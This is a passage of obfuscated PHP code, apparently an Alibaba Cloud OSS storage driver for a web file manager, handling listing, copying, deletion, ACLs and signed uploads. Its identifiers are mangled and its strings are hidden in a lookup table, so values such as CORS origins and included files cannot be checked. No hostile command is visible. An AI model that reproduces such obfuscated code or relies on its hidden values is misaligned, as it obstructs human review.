array(); public function __construct($–©©âåŒ) { parent::__construct(); include_once SDK_DIR . $_SERVER[—ÌÒğš÷][1411]; $this->_init($–©©âåŒ); } public function _init($§×¤¦´) { $¾†ãó×ª =& $_SERVER[—ÌÒğš÷]; $this->config = $§×¤¦´; foreach ($§×¤¦´ as $á¯÷Ä  => $¢ñ£Ÿ®) { if (isset($this->{$á¯÷Ä })) { $this->{$á¯÷Ä } = $¢ñ£Ÿ®; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($¾†ãó×ª[1412] . LNG($¾†ãó×ª[1413])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $İîşğòê =& $_SERVER[—ÌÒğš÷]; $ç£¾åêÙ = new OSS\Model\CorsConfig(); $™°óüàš = new OSS\Model\CorsRule(); $™°óüàš->addAllowedOrigin($İîşğòê[1414]); $™°óüàš->addAllowedMethod($İîşğòê[1415]); $™°óüàš->addAllowedMethod($İîşğòê[1416]); $™°óüàš->addAllowedMethod($İîşğòê[1417]); $™°óüàš->addAllowedMethod($İîşğòê[1418]); $™°óüàš->addAllowedMethod($İîşğòê[161]); $™°óüàš->setMaxAgeSeconds(600); $™°óüàš->addExposeHeader($İîşğòê[1419]); $™°óüàš->addAllowedHeader($İîşğòê[1414]); $ç£¾åêÙ->addRule($™°óüàš); try { $this->client->putBucketCors($this->bucket, $ç£¾åêÙ); } catch (OSS\Core\OssException $äÌø¹Ú¬) { return !1; } return !0; } public function getBucketCors() { $ÅôÖåã† =& $_SERVER[—ÌÒğš÷]; $Ë¦ñ»‰” = null; try { $Ë¦ñ»‰” = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $Ôì›Ï») { return null; } if (!$Ë¦ñ»‰” || !($ëö”‰Ş– = $Ë¦ñ»‰”->getRules())) { return null; } $ÉÎÅ¸²Æ = $ëö”‰Ş–[0]->getAllowedOrigins(); $ãâÔç¥’ = $ëö”‰Ş–[0]->getAllowedMethods(); $±Ô‹Áë = $ëö”‰Ş–[0]->getMaxAgeSeconds(); $À¦µ­Ô® = $ëö”‰Ş–[0]->getExposeHeaders(); $×Õ˜Şù = $ëö”‰Ş–[0]->getAllowedHeaders(); return array($ÅôÖåã†[202] => isset($ÉÎÅ¸²Æ[0]) ? $ÉÎÅ¸²Æ[0] : $ÅôÖåã†[12], $ÅôÖåã†[206] => $ãâÔç¥’, $ÅôÖåã†[1420] => $±Ô‹Áë, $ÅôÖåã†[1421] => isset($À¦µ­Ô®[0]) ? $À¦µ­Ô®[0] : $ÅôÖåã†[12], $ÅôÖåã†[204] => isset($×Õ˜Şù[0]) ? $×Õ˜Şù[0] : $ÅôÖåã†[12]); } public function isBucketCors() { $Ùã›¢‘Ó =& $_SERVER[—ÌÒğš÷]; $Øû§”¸Œ = $this->getBucketCors(); if (!$Øû§”¸Œ || !is_array($Øû§”¸Œ)) { return !1; } if ($Øû§”¸Œ[$Ùã›¢‘Ó[202]] != $Ùã›¢‘Ó[203] || $Øû§”¸Œ[$Ùã›¢‘Ó[204]] != $Ùã›¢‘Ó[203]) { return !1; } $Ğ„É†’Ä = array_map($Ùã›¢‘Ó[205], $Øû§”¸Œ[$Ùã›¢‘Ó[206]]); if (!is_array($Ğ„É†’Ä)) { $Ğ„É†’Ä = array(); } $üİğäÊ¢ = array($Ùã›¢‘Ó[207], $Ùã›¢‘Ó[208], $Ùã›¢‘Ó[209], $Ùã›¢‘Ó[210], $Ùã›¢‘Ó[211]); $·™»¸§å = array_diff($üİğäÊ¢, $Ğ„É†’Ä); return empty($·™»¸§å); } public function mkfile($Üµµãå¤, $¸Ó£¶£¿ = '', $ç‡¯ˆÊ÷ = REPEAT_RENAME) { $¿ı¥Úñ = $this->setContent($Üµµãå¤, $¸Ó£¶£¿); if ($¿ı¥Úñ !== !1) { return $this->getPathOuter($Üµµãå¤); } return !1; } public function mkdir($“–» “, $ëæîÉÎ = REPEAT_SKIP) { if ($ëæîÉÎ && $this->_isFolder($“–» “)) { return $this->getPathOuter($“–» “); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($“–» “)); } catch (OSS\Core\OssException $Ãëç‚ÑÙ) { return !1; } return $this->getPathOuter($“–» “); } private function fileList($óª·ê—€, $úÎ¯®“„ = '', $ÕÄÅÃ¤Ô = 0) { $°À£¤› =& $_SERVER[—ÌÒğš÷]; $óª·ê—€ = trim($óª·ê—€, $°À£¤›[8]); $Òî†œÅÉ = empty($óª·ê—€) && $óª·ê—€ !== $°À£¤›[212] ? $°À£¤›[12] : $óª·ê—€ . $°À£¤›[8]; $—ú´¯–Ã = $°À£¤›[12]; $è¸Êï×ê = 1000; $Àë´üÙ¦ = $¹÷œê³ = array(); while (!0) { check_abort(); $á¶¦âÛ“ = array($°À£¤›[1422] => $úÎ¯®“„, $°À£¤›[1423] => $Òî†œÅÉ, $°À£¤›[1424] => $è¸Êï×ê, $°À£¤›[1425] => $—ú´¯–Ã); try { $ÈıÒ‹€ = $this->client->listObjects($this->bucket, $á¶¦âÛ“); } catch (OSS\Core\OssException $è‚¦í§) { break; } $—ú´¯–Ã = $ÈıÒ‹€->getNextMarker(); $ç†Íêš = $ÈıÒ‹€->getObjectList(); $—ì¿€ñÖ = $ÈıÒ‹€->getPrefixList(); foreach ($ç†Íêš as $èéõõá) { if ($èéõõá->getKey() == $Òî†œÅÉ) { continue; } $¹¹§óß = $èéõõá->getKey(); $İËÜ§¶ = $èéõõá->getSize(); $Æ«¸Ç¡ = $èéõõá->getLastModified(); $Å›ÎĞ¸ = trim($èéõõá->getETag(), $°À£¤›[118]); $ÈıÁªª¢ = $ÕÄÅÃ¤Ô ? array($°À£¤›[32] => $¹¹§óß, $°À£¤›[76] => $İËÜ§¶, $°À£¤›[194] => strtotime($Æ«¸Ç¡), $°À£¤›[1426] => $Å›ÎĞ¸) : $¹¹§óß; $š’¨›Á— = $İËÜ§¶ == 0 && substr($¹¹§óß, strlen($¹¹§óß) - 1, 1) == $°À£¤›[8] ? !0 : !1; $×şâ¶‰ = array($°À£¤›[76] => $İËÜ§¶, $°À£¤›[1427] => $İËÜ§¶, $°À£¤›[85] => strtotime($Æ«¸Ç¡), $°À£¤›[1428] => $Æ«¸Ç¡, $°À£¤›[1426] => $Å›ÎĞ¸); $this->cacheMethodInfoSet($¹¹§óß, $š’¨›Á—, $×şâ¶‰); if ($š’¨›Á—) { $Àë´üÙ¦[] = $¹¹§óß; continue; } $¹÷œê³[] = $ÈıÁªª¢; } foreach ($—ì¿€ñÖ as $˜æëÓ½Æ) { $Àë´üÙ¦[] = $˜æëÓ½Æ->getPrefix(); $this->cacheMethodInfoSet($˜æëÓ½Æ->getPrefix(), !0); } if ($—ú´¯–Ã === $°À£¤›[12]) { break; } } $this->cacheMethodInfoSet($óª·ê—€, !0); return array($°À£¤›[82] => $Àë´üÙ¦, $°À£¤›[83] => $¹÷œê³); } public function copyFile($×§Ó›Â, $ü«÷ñ³Ø) { $Ùê£êî = $this->size($×§Ó›Â); if ($Ùê£êî < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $×§Ó›Â, $this->bucket, $this->pathEncode($ü«÷ñ³Ø)); } catch (OSS\Core\OssException $é»å¡§õ) { return !1; } return $this->getPathOuter($ü«÷ñ³Ø); } $¦×ÕãÇ = $this->multiCopyObject($×§Ó›Â, $ü«÷ñ³Ø, $Ùê£êî); return $¦×ÕãÇ ? $this->getPathOuter($ü«÷ñ³Ø) : !1; } private function multiCopyObject($¤ß•‘úÄ, $êèµÛÙ£, $œÔ†ß«Æ) { $Á±ŠòÁ =& $_SERVER[—ÌÒğš÷]; try { $©µæšÄä = array(); if ($ô°ëé¾ñ = $this->hashMd5($¤ß•‘úÄ)) { $©µæšÄä = array(OSS\OssClient::OSS_HEADERS => array($Á±ŠòÁ[1429] => $ô°ëé¾ñ)); } $‚¨…ÇÓä = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($êèµÛÙ£), $©µæšÄä); $€šËÂÕê = 1; $Áç¬™òŠ = 0; $ÊƒİÓ¬¬ = array(); $¾µœİºµ = 1024 * 1024 * 10; $¤òÂµı = $this->client->generateMultiuploadParts($œÔ†ß«Æ, $¾µœİºµ); foreach ($¤òÂµı as $»™ñ“Ë => $ÅùòşÄ) { $–ÌêÙû› = $Áç¬™òŠ + (int) $ÅùòşÄ[$Á±ŠòÁ[1430]]; $¹ğ¨ä®Ş = (int) $ÅùòşÄ[$Á±ŠòÁ[381]] + $–ÌêÙû› - 1; $¶ÑØ©Î÷ = array($Á±ŠòÁ[1431] => $–ÌêÙû›, $Á±ŠòÁ[1432] => $¹ğ¨ä®Ş); $ÊƒİÓ¬¬[] = $this->client->uploadPartCopy($this->bucket, $¤ß•‘úÄ, $this->bucket, $this->pathEncode($êèµÛÙ£), $€šËÂÕê, $‚¨…ÇÓä, $¶ÑØ©Î÷); $€šËÂÕê = $€šËÂÕê + 1; } $ªÈÀÌÉŸ = array(); foreach ($ÊƒİÓ¬¬ as $»™ñ“Ë => $ù÷Ñ”) { $ªÈÀÌÉŸ[] = array($Á±ŠòÁ[1433] => $»™ñ“Ë + 1, $Á±ŠòÁ[1434] => $ù÷Ñ”); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($êèµÛÙ£), $‚¨…ÇÓä, $ªÈÀÌÉŸ); } catch (OSS\Core\OssException $”ƒÄÙ¡Û) { return !1; } return !0; } public function moveFile($Í‹ç…›, $¾µ—È„) { if ($this->copyFile($Í‹ç…›, $¾µ—È„)) { $this->remove($Í‹ç…›); return $this->getPathOuter($¾µ—È„); } return !1; } public function delFile($À›¢«Òø) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($À›¢«Òø)); } catch (OSS\Core\OssException $ıúª»ÓÛ) { return !1; } return !0; } public function delFolder($‰Î¤ÊÅ) { $ş©‚×Ôƒ =& $_SERVER[—ÌÒğš÷]; if (!$this->exist($‰Î¤ÊÅ)) { return !0; } $this->listItemCache = !1; $Ç·øªéÙ = $this->fileList($‰Î¤ÊÅ); $this->listItemCache = !0; $˜Ò¡‰Ù™ = trim($‰Î¤ÊÅ, $ş©‚×Ôƒ[8]) . $ş©‚×Ôƒ[8]; if (!empty($‰Î¤ÊÅ) && $‰Î¤ÊÅ !== $ş©‚×Ôƒ[212] && !in_array($˜Ò¡‰Ù™, $Ç·øªéÙ[$ş©‚×Ôƒ[82]])) { $Ç·øªéÙ[$ş©‚×Ôƒ[82]][] = $˜Ò¡‰Ù™; } $¨’×Î¦Œ = $this->delByBatch($Ç·øªéÙ[$ş©‚×Ôƒ[83]]); if (!$¨’×Î¦Œ) { return !1; } $¨’×Î¦Œ = $this->delByBatch($Ç·øªéÙ[$ş©‚×Ôƒ[82]]); if (!$¨’×Î¦Œ) { return !1; } return $this->delFile($˜Ò¡‰Ù™); } private function delByBatch($€½†»§˜) { foreach (array_chunk($€½†»§˜, 1000) as $Ÿ‚Ë¡¼©) { try { $this->client->deleteObjects($this->bucket, $Ÿ‚Ë¡¼©); } catch (OSS\Core\OssException $‰‰Îûó‚) { return !1; } } return !0; } public function rename($Ñ¤Éş†Š, $˜ÊöìÇá) { return $this->renameObject($Ñ¤Éş†Š, $˜ÊöìÇá); } private function fileInfo($ñı´åğŒ, $ ƒ¬Ğóô = false, $äÄã’¬½ = array()) { $÷ğ¬â€• =& $_SERVER[—ÌÒğš÷]; $òá¹ = array($÷ğ¬â€•[32] => $this->pathThis($ñı´åğŒ), $÷ğ¬â€•[84] => $this->getPathOuter($ñı´åğŒ), $÷ğ¬â€•[33] => $÷ğ¬â€•[214], $÷ğ¬â€•[76] => isset($äÄã’¬½[$÷ğ¬â€•[76]]) ? $äÄã’¬½[$÷ğ¬â€•[76]] : 0, $÷ğ¬â€•[175] => $this->ext($ñı´åğŒ)); if ($ ƒ¬Ğóô) { return $òá¹; } $òá¹[$÷ğ¬â€•[215]] = $òá¹[$÷ğ¬â€•[85]] = 0; $òá¹[$÷ğ¬â€•[216]] = $òá¹[$÷ğ¬â€•[217]] = !0; if (empty($äÄã’¬½)) { $Æ¼¹Ò­¶ = $this->objectMeta($ñı´åğŒ); if (!$Æ¼¹Ò­¶) { return $òá¹; } $äÄã’¬½ = array($÷ğ¬â€•[85] => strtotime($Æ¼¹Ò­¶[$÷ğ¬â€•[1428]]), $÷ğ¬â€•[76] => $Æ¼¹Ò­¶[$÷ğ¬â€•[1427]] + 0, $÷ğ¬â€•[1426] => $Æ¼¹Ò­¶[$÷ğ¬â€•[1426]]); } if (isset($äÄã’¬½[$÷ğ¬â€•[1426]]) && $äÄã’¬½[$÷ğ¬â€•[1426]]) { $òá¹[$÷ğ¬â€•[219]] = trim($äÄã’¬½[$÷ğ¬â€•[1426]], $÷ğ¬â€•[118]); } if (isset($äÄã’¬½[$÷ğ¬â€•[76]])) { $òá¹[$÷ğ¬â€•[76]] = $äÄã’¬½[$÷ğ¬â€•[76]]; } if (isset($äÄã’¬½[$÷ğ¬â€•[85]])) { $òá¹[$÷ğ¬â€•[85]] = $äÄã’¬½[$÷ğ¬â€•[85]]; } if (isset($äÄã’¬½[$÷ğ¬â€•[194]]) && !trim($òá¹[$÷ğ¬â€•[85]])) { $òá¹[$÷ğ¬â€•[85]] = $äÄã’¬½[$÷ğ¬â€•[194]]; } return $òá¹; } private function folderInfo($™ÇÚ°ğŸ, $Ùğ™³Ï° = false, $ƒ¨Ùù¾ = array()) { $àïÕ¶ÆÖ =& $_SERVER[—ÌÒğš÷]; $•ãèòàú = array($àïÕ¶ÆÖ[32] => $this->pathThis($™ÇÚ°ğŸ), $àïÕ¶ÆÖ[84] => $this->getPathOuter($àïÕ¶ÆÖ[8] . $™ÇÚ°ğŸ), $àïÕ¶ÆÖ[33] => $àïÕ¶ÆÖ[75]); if ($Ùğ™³Ï°) { return $•ãèòàú; } $•ãèòàú[$àïÕ¶ÆÖ[215]] = $•ãèòàú[$àïÕ¶ÆÖ[85]] = 0; $•ãèòàú[$àïÕ¶ÆÖ[216]] = $•ãèòàú[$àïÕ¶ÆÖ[217]] = !0; if (empty($ƒ¨Ùù¾)) { $™ÇÚ°ğŸ = rtrim($™ÇÚ°ğŸ, $àïÕ¶ÆÖ[8]) . $àïÕ¶ÆÖ[8]; $Ã¨…ˆš¾ = $this->objectMeta($™ÇÚ°ğŸ); if (!$Ã¨…ˆš¾) { return $•ãèòàú; } $ƒ¨Ùù¾ = array($àïÕ¶ÆÖ[215] => $Ã¨…ˆš¾[$àïÕ¶ÆÖ[544]][$àïÕ¶ÆÖ[1435]], $àïÕ¶ÆÖ[85] => strtotime($Ã¨…ˆš¾[$àïÕ¶ÆÖ[1428]])); } if (isset($ƒ¨Ùù¾[$àïÕ¶ÆÖ[85]])) { $•ãèòàú[$àïÕ¶ÆÖ[85]] = $ƒ¨Ùù¾[$àïÕ¶ÆÖ[85]]; } if (isset($ƒ¨Ùù¾[$àïÕ¶ÆÖ[215]])) { $•ãèòàú[$àïÕ¶ÆÖ[215]] = $ƒ¨Ùù¾[$àïÕ¶ÆÖ[215]]; } return $•ãèòàú; } public function listPath($ˆó«´†¥, $Ç„İÙ–† = false) { $¶½ĞŞçí =& $_SERVER[—ÌÒğš÷]; $ÉêêşÚµ = $this->fileList($ˆó«´†¥, $¶½ĞŞçí[8], !0); foreach ($ÉêêşÚµ[$¶½ĞŞçí[82]] as $ Û©¾• => $‰¾Å³˜û) { $ÉêêşÚµ[$¶½ĞŞçí[82]][$ Û©¾•] = $this->folderInfo($‰¾Å³˜û, $Ç„İÙ–†, $‰¾Å³˜û); } foreach ($ÉêêşÚµ[$¶½ĞŞçí[83]] as $ Û©¾• => $‰¾Å³˜û) { $ÉêêşÚµ[$¶½ĞŞçí[83]][$ Û©¾•] = $this->fileInfo($‰¾Å³˜û[$¶½ĞŞçí[32]], $Ç„İÙ–†, $‰¾Å³˜û); } return $ÉêêşÚµ; } protected function infoChildren($×Ö›µï, &$àÖ†Ş´†) { $Ö‰…†Š– =& $_SERVER[—ÌÒğš÷]; $ˆ™¸·Şì = $this->fileList($×Ö›µï, $Ö‰…†Š–[12], !0); $àÖ†Ş´†[$Ö‰…†Š–[78]] += count($ˆ™¸·Şì[$Ö‰…†Š–[82]]); $àÖ†Ş´†[$Ö‰…†Š–[77]] += count($ˆ™¸·Şì[$Ö‰…†Š–[83]]); foreach ($ˆ™¸·Şì[$Ö‰…†Š–[83]] as $¾‹²¤£¦) { if (!$¾‹²¤£¦ || !$¾‹²¤£¦[$Ö‰…†Š–[76]]) { continue; } $àÖ†Ş´†[$Ö‰…†Š–[76]] += $¾‹²¤£¦[$Ö‰…†Š–[76]]; } } public function has($Æ„½Î·¸, $½†ı´Ïâ = false, $™Û˜öË‹ = true) { $ÀŞğ®’Å =& $_SERVER[—ÌÒğš÷]; $Æ„½Î·¸ = trim($Æ„½Î·¸, $ÀŞğ®’Å[8]); $œìâÁ¿ğ = empty($Æ„½Î·¸) && $Æ„½Î·¸ !== $ÀŞğ®’Å[212] ? $ÀŞğ®’Å[12] : $Æ„½Î·¸ . $ÀŞğ®’Å[8]; $‡ë©áÁ = $ÀŞğ®’Å[12]; $ôıÊÙ¥Ô = 500; $Š·½°ƒĞ = $İ“ïÚÖ = 0; while (!0) { check_abort(); $ÈßßğñÒ = array($ÀŞğ®’Å[1422] => $ÀŞğ®’Å[8], $ÀŞğ®’Å[1423] => $œìâÁ¿ğ, $ÀŞğ®’Å[1424] => $ôıÊÙ¥Ô, $ÀŞğ®’Å[1425] => $‡ë©áÁ); try { $ğ£Ä”Ê† = $this->client->listObjects($this->bucket, $ÈßßğñÒ); } catch (OSS\Core\OssException $…´Ã¾³Ğ) { break; } $‡ë©áÁ = $ğ£Ä”Ê†->getNextMarker(); $¸· ¡ÚÆ = $ğ£Ä”Ê†->getObjectList(); $¯¿â”Ù = $ğ£Ä”Ê†->getPrefixList(); if ($½†ı´Ïâ) { if (count($¸· ¡ÚÆ) > 1 || count($¸· ¡ÚÆ) == 1 && $¸· ¡ÚÆ[0]->getKey() != $œìâÁ¿ğ) { $Š·½°ƒĞ += count($¸· ¡ÚÆ) - 1; } if (!empty($¯¿â”Ù)) { $İ“ïÚÖ += count($¯¿â”Ù); } if ($‡ë©áÁ === $ÀŞğ®’Å[12]) { break; } continue; } if ($™Û˜öË‹) { if (!empty($¸· ¡ÚÆ)) { if (count($¸· ¡ÚÆ) > 1 || $¸· ¡ÚÆ[0]->getKey() != $œìâÁ¿ğ) { return !0; } } } else { if (!empty($¯¿â”Ù)) { return !0; } } if ($‡ë©áÁ === $ÀŞğ®’Å[12]) { break; } } if ($½†ı´Ïâ) { return array($ÀŞğ®’Å[223] => $Š·½°ƒĞ, $ÀŞğ®’Å[224] => $İ“ïÚÖ); } return !1; } public function listAll($Ëëæµ†ô) { $¿ëóëÊ­ =& $_SERVER[—ÌÒğš÷]; $üµ˜Ãø¦ = $this->fileList($Ëëæµ†ô, $¿ëóëÊ­[12], !0); $ñÙíËı¯ = array_to_keyvalue($üµ˜Ãø¦[$¿ëóëÊ­[83]], $¿ëóëÊ­[32]); foreach ($üµ˜Ãø¦[$¿ëóëÊ­[82]] as $‡ñä¯…¥) { if (is_string($‡ñä¯…¥)) { $ñÙíËı¯[$‡ñä¯…¥] = array($¿ëóëÊ­[76] => 0); } } return $this->listAllFiles($Ëëæµ†ô, $ñÙíËı¯); } public function canRead($˜öÑ­‘…) { $ŸÄğé’ =& $_SERVER[—ÌÒğš÷]; $¸ûñ¨•â = $this->pathAcl($˜öÑ­‘…); return $¸ûñ¨•â == $ŸÄğé’[1436] || $¸ûñ¨•â == $ŸÄğé’[587] ? !0 : !1; } public function canWrite($¦®ıáÃ“) { $ñÒïÚ½Ğ = $this->pathAcl($¦®ıáÃ“); return $ñÒïÚ½Ğ == $_SERVER[—ÌÒğš÷][587] ? !0 : !1; } public function pathAcl($±§’ø¡¾) { $Ä°¸¤ªÁ =& $_SERVER[—ÌÒğš÷]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $š”«ïòŸ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($±§’ø¡¾)); } catch (OSS\Core\OssException $˜‚¡’š) { return !1; } $šÕ¸÷î = $š”«ïòŸ == $Ä°¸¤ªÁ[37] ? $this->bucketAcl : $š”«ïòŸ; if ($šÕ¸÷î == $Ä°¸¤ªÁ[1437]) { return $Ä°¸¤ªÁ[1436]; } if ($šÕ¸÷î == $Ä°¸¤ªÁ[1438]) { return $Ä°¸¤ªÁ[587]; } return $šÕ¸÷î; } private function chmodPath($ìºËå´î, $º§ıµªÉ = '') { $ÉÆÔ³´ =& $_SERVER[—ÌÒğš÷]; $¡¶Ì¶©¥ = empty($º§ıµªÉ) ? $ÉÆÔ³´[1438] : $º§ıµªÉ; $áçÇÈÜÂ = array($ÉÆÔ³´[37], $ÉÆÔ³´[213], $ÉÆÔ³´[1437], $ÉÆÔ³´[1438]); if (!in_array($¡¶Ì¶©¥, $áçÇÈÜÂ)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($ìºËå´î), $¡¶Ì¶©¥); } catch (OSS\Core\OssException $ÖÄØ‡úÖ) { return !1; } return !0; } public function getContent($¿Í•Ùª) { return $this->fileSubstr($¿Í•Ùª, -1); } public function setContent($œå­ÂùÃ, $£³¹¤† = '') { $ÜÕÕ³ë =& $_SERVER[—ÌÒğš÷]; try { $è¯×®øİ = $this->trafficLimit($ÜÕÕ³ë[1439]); $‚Ãƒ›‹ = $this->client->putObject($this->bucket, $this->pathEncode($œå­ÂùÃ), $£³¹¤†, $è¯×®øİ); } catch (OSS\Core\OssException $ü¦úô°Ù) { return !1; } $–¯°İ  = array($ÜÕÕ³ë[1429] => trim($‚Ãƒ›‹[$ÜÕÕ³ë[1426]], $ÜÕÕ³ë[118]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($œå­ÂùÃ))); $this->updateObjMeta($œå­ÂùÃ, $–¯°İ ); return isset($‚Ãƒ›‹[$ÜÕÕ³ë[1440]][$ÜÕÕ³ë[275]]) ? !0 : !1; } private function updateObjMeta($³’µÚç‡, $Å•ıÑñ) { $³’µÚç‡ = $this->pathEncode($³’µÚç‡); try { $ßçŞ¼Û• = array(OSS\OssClient::OSS_HEADERS => $Å•ıÑñ); $this->client->copyObject($this->bucket, $³’µÚç‡, $this->bucket, $³’µÚç‡, $ßçŞ¼Û•); } catch (OSS\Core\OssException $Ø…ÇØŞ) { return !1; } return !0; } public function upload($¼ëæë‰, $÷Œ²Êõ­, $™£¢û¹ç = false, $£Ï ¾‘ = REPEAT_REPLACE) { $Ñæ˜˜Ñ¦ =& $_SERVER[—ÌÒğš÷]; $ŠÒ¼‚• = trim($¼ëæë‰, $Ñæ˜˜Ñ¦[8]); $ê›Ê’Ùà = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($Ñæ˜˜Ñ¦[1429] => @md5_file($÷Œ²Êõ­)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($¼ëæë‰))); $ê›Ê’Ùà = $this->trafficLimit($Ñæ˜˜Ñ¦[1439], $ê›Ê’Ùà); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($ŠÒ¼‚•), $÷Œ²Êõ­, $ê›Ê’Ùà); } catch (OSS\Core\OssException $¾ïÚ–ş—) { return !1; } return $this->getPathOuter($¼ëæë‰); } public function getHost() { $ã”¡ÊŠÂ =& $_SERVER[—ÌÒğš÷]; $ñÂûòĞø = explode($ã”¡ÊŠÂ[198], parent::getHost()); return $ñÂûòĞø[0] . $ã”¡ÊŠÂ[198] . $this->bucket . $ã”¡ÊŠÂ[10] . $ñÂûòĞø[1]; } public function uploadFormData($Ú˜ú„ŸÈ, $ÙÈ§áÀê = 3600) { $ÍÈ²’¢³ =& $_SERVER[—ÌÒğš÷]; if (!($“ÇüÖ›ˆ = $this->getHost())) { return !1; } $›ØÑôœğ = $ÙÈ§áÀê; $®ç‚¸ÆÈ = date($ÍÈ²’¢³[1441], time() + $›ØÑôœğ); $íşÑÌÎş = new DateTime($®ç‚¸ÆÈ); $»ŞıİûŞ = $íşÑÌÎş->format(DateTime::ISO8601); $Äçã±òê = strpos($»ŞıİûŞ, $ÍÈ²’¢³[340]); $»ŞıİûŞ = substr($»ŞıİûŞ, 0, $Äçã±òê) . $ÍÈ²’¢³[1442]; $â­ªÛ†Ø = 1048576000 * 5; $é¿‚á€Ç = $this->pathFather($Ú˜ú„ŸÈ); $àÙˆÁŸë = array($ÍÈ²’¢³[258] => $»ŞıİûŞ, $ÍÈ²’¢³[261] => array(array($ÍÈ²’¢³[1443], 0, $â­ªÛ†Ø), array($ÍÈ²’¢³[264], $ÍÈ²’¢³[265], $é¿‚á€Ç))); $ã³Ÿ£ÄÔ = base64_encode(json_encode($àÙˆÁŸë)); $¾³©˜­© = base64_encode(hash_hmac($ÍÈ²’¢³[247], $ã³Ÿ£ÄÔ, $this->secret, !0)); $šŞ¬¡Ò = array($ÍÈ²’¢³[276] => $ã³Ÿ£ÄÔ, $ÍÈ²’¢³[1444] => $this->accessKey, $ÍÈ²’¢³[268] => $ÍÈ²’¢³[257], $ÍÈ²’¢³[1445] => $¾³©˜­©, $ÍÈ²’¢³[196] => $“ÇüÖ›ˆ); $šŞ¬¡Ò = $this->trafficLimit($ÍÈ²’¢³[1439], $šŞ¬¡Ò); return $šŞ¬¡Ò; } public function multiUploadFormData($ƒÙşĞò , $÷—ˆ¿é = 3600) { $¦éÊ¾Ë =& $_SERVER[—ÌÒğš÷]; if (!($à¼Íå„ = $this->getHost())) { return !1; } $¾¹À•Æ” = $this->trafficLimit($¦éÊ¾Ë[1439]); $Ó­ÃÛ…ò = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ƒÙşĞò ), $¾¹À•Æ”); return array($¦éÊ¾Ë[238] => $Ó­ÃÛ…ò, $¦éÊ¾Ë[196] => $à¼Íå„ . $¦éÊ¾Ë[8] . $this->pathEncode($ƒÙşĞò ), $¦éÊ¾Ë[239] => gmdate($¦éÊ¾Ë[1446]), $¦éÊ¾Ë[94] => $ƒÙşĞò ); } public function multiUploadAuthData($¤ñÄ¬™é, $æŞÆºÂ = array()) { $Ç´”ÎÙ¹ =& $_SERVER[—ÌÒğš÷]; $Ë ¨¢õß = isset($æŞÆºÂ[$Ç´”ÎÙ¹[239]]) ? $æŞÆºÂ[$Ç´”ÎÙ¹[239]] : gmdate($Ç´”ÎÙ¹[1446]); $‡“úúÉÆ = isset($æŞÆºÂ[$Ç´”ÎÙ¹[175]]) ? $æŞÆºÂ[$Ç´”ÎÙ¹[175]] : $Ç´”ÎÙ¹[12]; $Ö± ¶ò  = $¤ñÄ¬™é; if (isset($æŞÆºÂ[$Ç´”ÎÙ¹[94]])) { $Ö± ¶ò  = $æŞÆºÂ[$Ç´”ÎÙ¹[94]]; unset($æŞÆºÂ[$Ç´”ÎÙ¹[94]]); } if (isset($æŞÆºÂ[$Ç´”ÎÙ¹[240]])) { $æŞÆºÂ[$Ç´”ÎÙ¹[239]] = $Ë ¨¢õß; return $this->listUploadParts($Ö± ¶ò , $æŞÆºÂ); } $ıèñÛîÜ = array($Ç´”ÎÙ¹[241], $Ç´”ÎÙ¹[12], $Ç´”ÎÙ¹[120], $Ë ¨¢õß, "\x78\55\157\x73\x73\55\144\x61\x74\145\x3a{$Ë ¨¢õß}", $Ç´”ÎÙ¹[8] . $this->bucket . $Ç´”ÎÙ¹[8] . $Ö± ¶ò  . $‡“úúÉÆ); if (strpos($‡“úúÉÆ, $Ç´”ÎÙ¹[242]) === 0) { $ıèñÛîÜ[0] = $Ç´”ÎÙ¹[243]; if ($÷Áò”µ× = $this->trafficLimit($Ç´”ÎÙ¹[1439])) { $Ö± ¶ò  = $Ç´”ÎÙ¹[1447]; array_splice($ıèñÛîÜ, 5, 0, $Ö± ¶ò  . $Ç´”ÎÙ¹[4] . $÷Áò”µ×[$Ö± ¶ò ]); } } if (isset($æŞÆºÂ[$Ç´”ÎÙ¹[244]]) && $æŞÆºÂ[$Ç´”ÎÙ¹[244]] == $Ç´”ÎÙ¹[245]) { $ıèñÛîÜ[0] = $Ç´”ÎÙ¹[245]; } if (!empty($æŞÆºÂ[$Ç´”ÎÙ¹[1448]])) { $»ãû‚ô = array_merge(array($ıèñÛîÜ[4]), $æŞÆºÂ[$Ç´”ÎÙ¹[1448]]); sort($»ãû‚ô); $ıèñÛîÜ[4] = implode($Ç´”ÎÙ¹[246], $»ãû‚ô); } $öĞ¨‹î± = implode($Ç´”ÎÙ¹[246], $ıèñÛîÜ); $î êÇô´ = base64_encode(hash_hmac($Ç´”ÎÙ¹[247], $öĞ¨‹î±, $this->secret, !0)); $µˆæÉÖª = $Ç´”ÎÙ¹[1412] . $this->accessKey . $Ç´”ÎÙ¹[4] . $î êÇô´; if (strpos($‡“úúÉÆ, $Ç´”ÎÙ¹[242]) === 0) { $µˆæÉÖª = array($Ç´”ÎÙ¹[249] => $µˆæÉÖª, $Ç´”ÎÙ¹[239] => $Ë ¨¢õß); if ($÷Áò”µ×) { $µˆæÉÖª = array_merge($µˆæÉÖª, $÷Áò”µ×); } } return $µˆæÉÖª; } public function listUploadParts($ß“ÊÖà¹, $íÏ§å–) { $õ­É¿èí =& $_SERVER[—ÌÒğš÷]; $ªĞõÕğÕ = parse_url_query($íÏ§å–[$õ­É¿èí[175]]); $¥¯ƒ„ú = $this->client->listParts($this->bucket, $this->pathEncode($ß“ÊÖà¹), $ªĞõÕğÕ[$õ­É¿èí[238]]); 